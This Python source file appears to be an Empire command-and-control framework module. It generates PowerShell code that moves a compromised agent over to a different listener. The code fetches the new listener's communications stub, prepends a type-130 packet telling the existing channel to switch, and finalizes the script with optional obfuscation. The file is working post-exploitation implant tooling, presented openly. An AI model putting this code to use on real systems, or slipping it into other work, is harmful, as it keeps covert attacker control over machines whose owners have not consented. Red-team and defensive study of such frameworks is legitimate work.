from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        # extract all of our options
        listener_name = params["Listener"]

        active_listener = main_menu.listenersv2.get_active_listener_by_name(
            listener_name
        )
        if not active_listener:
            raise ModuleValidationException(
                f"[!] Listener '{listener_name}' doesn't exist!"
            )

        listener_options = active_listener.options

        script = main_menu.listenertemplatesv2.new_instance(
            active_listener.info["Name"]
        ).generate_comms(listenerOptions=listener_options, language="powershell")

        # signal the existing listener that we're switching listeners, and the new comms code
        script = f"Send-Message -Packets $(Encode-Packet -Type 130 -Data '{listener_name}');\n{script}"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
